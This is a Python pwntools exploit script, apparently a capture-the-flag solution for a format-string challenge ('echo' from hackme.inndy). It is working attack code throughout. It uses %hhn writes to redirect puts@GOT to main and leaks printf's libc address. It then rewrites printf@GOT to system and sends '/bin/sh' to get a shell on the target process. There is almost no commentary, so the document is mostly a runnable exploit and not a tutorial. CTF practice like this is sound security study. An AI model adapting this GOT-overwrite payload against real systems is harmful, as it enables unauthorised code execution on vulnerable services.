#!/usr/bin/env python3

#from hackme.inndy echo
from pwn import *
from random import randint

def debug(addr = '0x080485B8'):
    raw_input('debug:')
    gdb.attach(r, "b *" + addr)

# replaced by p64
# def split_into_bytes(integer, ljust_len = 8, ljust_char = b'\x00'):
#     result = b''
#     while integer > 0:
#         result += (integer & 0xff).to_bytes(1, 'little')
#         integer >>= 8
#     if ljust_len:
#         while len(result) < ljust_len:
#             result += ljust_char
#     return result



class Pwn:
    _payload = ''

    def __init__(self):
        filename = 'payload'
        log.info('open file ' + filename)
        self._payload_file = open(filename, 'w')
        self._payload = ''
        self._payload_len = 0

    def __del__(self):
    	self._payload_file.close()

    def get_payload(self):
        return self._payload

    def append_payload(self, payload):
        self._payload += payload
        self._payload_file.write(payload)

    def clear_payload(self):
        self._payload = ''

    def print_payload(self, message = None):
        if message != None:
            log.info(message)
        log.info("payload: (length = " + str(len(self._payload)) + ')')
        log.info(hexdump(self._payload))

    def send_payload_line(self, target):
        target.sendline(self._payload)
        self._payload_file.write('\n')

    def ljust_qword_based(self, fill_char = 'A'):
        '''add padding to be 8-byte-aligned'''
        new_payload = self._payload.ljust(
            (len(self._payload) + 8 - 1) // 8 * 8, fill_char)
        padded_count = len(new_payload) - len(self._payload)
        self._payload_file.write(fill_char * padded_count)
        self._payload = new_payload
        return padded_count


#objdump -dj .plt test
context(arch='amd64', os='linux', log_level='debug')

r = process('./fmt')
#r = remote('hackme.inndy.tw', 7711)

printf_arg_offset = 16
main_addr = 0x400646
puts_plt = 0x4004f0
puts_got = 0x601018
printf_plt = 0x400510
printf_got = 0x601028
printf_glibc_offset = 0x64e80
system_glibc_offset = 0x4f440
pwn = Pwn()
chars_printed = 0


# point puts@got to main
main_addr_bytes = p64(main_addr)
payload_tail = ''
for i in range(len(main_addr_bytes)):
    chars = main_addr_bytes[i]
    if i > 0:
        chars -= main_addr_bytes[i-1]
    if chars < 0:
        chars += 256
    if chars > 0:
        pwn.append_payload(f'%{chars}c')
    chars_printed += chars
    pwn.append_payload(f'%{i + printf_arg_offset}$hhn')
    payload_tail += p64(puts_got + i).decode()

chars_printed += pwn.ljust_qword_based()
pwn.append_payload(payload_tail)
pwn.send_payload_line(r)


# get printf@GLIBC offset
log.info('chars printed (spaces and "A"s):')
log.info(chars_printed)
pwn.clear_payload()
pwn.append_payload(f'%7$s')
pwn.ljust_qword_based()
pwn.append_payload(p64(printf_got).decode())
pwn.send_payload_line(r)


# stuff IO buffer
for i in range(0xfff):
    log.info("test round: " + str(i))
    r.sendline(b"Resu1tC0me0ut,qu1ck!!!")
    leak_message = r.recv(timeout = 0.001)
    if leak_message:
        break

printf_addr = u64(
    leak_message[chars_printed+3 : chars_printed+11]
        .rstrip(b'A').ljust(8, b'\x00'))
log.info('printf address: ' + hex(printf_addr))
system_addr = printf_addr - printf_glibc_offset + system_glibc_offset
log.info('system address: ' + hex(system_addr))


# point printf@got to system@GLIBC
pwn.clear_payload()
payload_tail = ''
system_addr_bytes = p64(system_addr)
for i in range(len(system_addr_bytes)):
    chars = system_addr_bytes[i]
    if i > 0:
        chars -= system_addr_bytes[i-1]
    if chars < 0:
        chars += 256
    if chars > 0:
        pwn.append_payload(f'%{chars}c')
    pwn.append_payload(f'%{i + 17}$hhn')
    payload_tail += p64(printf_got + i).decode()

pwn.ljust_qword_based()
pwn.append_payload(payload_tail)
pwn.send_payload_line(r)


# pwn and 0wn
r.sendline('/bin/sh')
# r.interactive()

# gdb.attach(r, 'x /x ' + hex(puts_got))


# elf = ELF('/home/soyccan/hackme.inndy/echo')
# print(elf.plt['puts'])
# printf_got_addr = elf.got['printf']
# # printf_got_addr = 0x601028
# print("%x" % printf_got_addr)
# system_plt_addr = elf.plt['system']
# print("%x" % system_plt_addr)

# payload = fmtstr_payload(7, {printf_got_addr: system_plt_addr})
# print( payload)                          #\x10\xa0\x0\x11\xa0\x0\x12\xa0\x0\x13\xa0\x0%240c%7$hhn%132c%8$hhn%128c%9$hhn%4c%10$hhn
# debug()
# r.sendline(payload)
# r.sendline('/bin/sh')
# r.interactive()
